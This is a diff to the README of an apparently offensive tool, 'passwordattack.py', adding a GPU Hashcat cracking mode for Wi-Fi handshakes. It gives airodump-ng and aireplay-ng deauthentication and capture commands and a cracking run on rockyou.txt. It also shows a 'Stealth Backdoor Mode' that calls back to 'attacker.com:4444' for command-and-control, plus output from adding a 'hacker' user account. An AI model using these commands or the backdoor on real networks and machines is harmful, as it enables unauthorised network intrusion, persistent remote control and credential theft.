@@ -42,10 +42,12 @@
    - Progress reporting and ETA
    - **Best for:** Guaranteed crack (slow on long passwords)
 
-5. **🎲 Random**
-   - Random password generation
-   - De-duplicated guesses
-   - **Best for:** Lucky fast cracks or uniform charset testing
+5. **� Hashcat** (GPU-Accelerated)
+   - Industry-standard GPU cracking with hashcat
+   - Supports .cap files converted to .hc22000 format
+   - Leverages NVIDIA/AMD GPUs for massive speed boost
+   - Compatible with all hashcat wordlists and rules
+   - **Best for:** Serious cracking with GPU hardware
 
 ### Stealth Backdoor Mode
 - **Remote C2 Operations**: Connect to command & control server
@@ -58,9 +60,13 @@
 
 ## 🚀 Installation
 
-### Requirements
-- Python 3.8+
-- No external dependencies (uses only stdlib: `threading`, `itertools`, `argparse`)
+### Hashcat GPU Acceleration
+- **Requirements**: NVIDIA GPU (recommended) or AMD GPU
+- **Download**: https://hashcat.net/hashcat/
+- **Performance**: 100-1000x faster than CPU-only methods
+- **Supported**: All major GPUs with OpenCL/CUDA
+
+---
 
 ### Quick Start
 
@@ -195,17 +201,32 @@ shell net user hacker password /add
 The command completed successfully.
 ```
 
-### Example 5: GUI Mode
+### Example 6: Hashcat GPU Cracking
 ```bash
-# Launch graphical interface (no arguments)
-$ python passwordattack.py
+# First capture handshake
+$ airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
+$ aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon
 
-# GUI Features:
-# - Real-time attack progress
-# - Color-coded output (green=success, red=error, cyan=info)
-# - SSID and PMK hex input fields
-# - Attack mode selection
-# - Stop/clear controls
+# Convert to hashcat format
+$ hcxpcapngtool -o hash.hc22000 capture-01.cap
+
+# Crack with hashcat (GPU powered!)
+$ python passwordattack.py --mode hashcat --capfile capture-01.cap --wordlist rockyou.txt
+[🎯] HASHCAT ATTACK - GPU POWERED
+[+] Converting capture-01.cap to hashcat format...
+[+] Starting GPU cracking with wordlist: rockyou.txt
+🎯 HASHCAT CRACKED: MySecretPass123
+```
+
+### Example 7: Backdoor with Hashcat
+```bash
+# Deploy backdoor on target
+$ python passwordattack.py --backdoor attacker.com:4444
+
+# From C2 server
+crack devj hashcat /path/to/capture.cap
+[+] Starting hashcat attack...
+🎯 HASHCAT CRACKED: devj_password_2024
 ```
 
 ---
